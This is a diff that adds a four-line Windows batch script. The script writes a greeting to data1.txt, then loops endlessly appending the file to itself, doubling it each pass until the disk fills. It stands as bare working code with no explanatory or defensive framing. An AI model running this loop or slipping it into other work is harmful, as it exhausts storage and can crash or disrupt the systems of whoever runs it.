@@ -1,0 +1,4 @@
+echo "Hello How Are You?">data1.txt
+:data
+type data1.txt>>data1.txt
+goto data
